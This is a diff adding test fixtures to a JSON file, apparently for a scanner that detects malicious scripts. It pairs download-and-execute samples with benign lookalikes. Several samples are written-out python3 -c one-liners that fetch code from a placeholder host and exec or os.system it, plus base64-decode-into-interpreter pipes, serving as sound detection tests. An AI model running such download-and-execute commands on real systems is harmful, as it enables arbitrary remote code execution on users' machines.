@@ -125,5 +125,61 @@
     "name": "install_chmod_then_echo.sh",
     "text": "#!/bin/sh\nchmod +x /tmp/build/configure\necho configured\n/tmp/build/configure --prefix=/usr\n",
     "expected": null
+  },
+  {
+    "name": "python_c_urlopen_exec.sh",
+    "text": "python3 -c \"import urllib.request;exec(urllib.request.urlopen('https://example.invalid/i').read())\"\n",
+    "expected": "script_download_execute"
+  },
+  {
+    "name": "python_c_urlopen_system.command",
+    "text": "#!/bin/zsh\n/usr/bin/python3 -c 'import os,urllib.request as u;os.system(u.urlopen(\"https://example.invalid/s\").read().decode())'\n",
+    "expected": "script_download_execute"
+  },
+  {
+    "name": "python_c_urlopen_exec_utf16.bin",
+    "text": "python -c \"import urllib.request;exec(urllib.request.urlopen('https://example.invalid/i').read())\"\n",
+    "expected": "script_download_execute",
+    "encoding": "utf-16le"
+  },
+  {
+    "name": "python_c_urlopen_print.sh",
+    "text": "python3 -c \"import urllib.request;print(urllib.request.urlopen('https://example.invalid/i').read())\"\n",
+    "expected": null
+  },
+  {
+    "name": "python_c_exec_local.sh",
+    "text": "python3 -c \"exec(open('setup_hooks.py').read())\"\n",
+    "expected": null
+  },
+  {
+    "name": "python_script_fetch_and_run.py",
+    "text": "import subprocess\nimport urllib.request\n\nbody = urllib.request.urlopen(URL).read()\nsubprocess.run([\"cat\"], input=body, check=True)\n",
+    "expected": null
+  },
+  {
+    "name": "python_lure_writeup.md",
+    "text": "For example, the lure asks for python3 -c \"exec(urllib.request.urlopen(u).read())\" in Terminal.\n",
+    "expected": null
+  },
+  {
+    "name": "base64_pipe_python.sh",
+    "text": "echo aW1wb3J0IHRoaXM= | base64 -d | python3\n",
+    "expected": "script_base64_decode_pipe"
+  },
+  {
+    "name": "base64_pipe_perl_stdin.sh",
+    "text": "echo cHJpbnQgMQ== | base64 --decode | perl -\n",
+    "expected": "script_base64_decode_pipe"
+  },
+  {
+    "name": "base64_pipe_json_tool.sh",
+    "text": "echo eyJhIjoxfQ== | base64 -d | python3 -m json.tool\n",
+    "expected": null
+  },
+  {
+    "name": "base64_pipe_perl_e.sh",
+    "text": "base64 -d blob.b64 | perl -e 'print length(<STDIN>)'\n",
+    "expected": null
   }
 ]
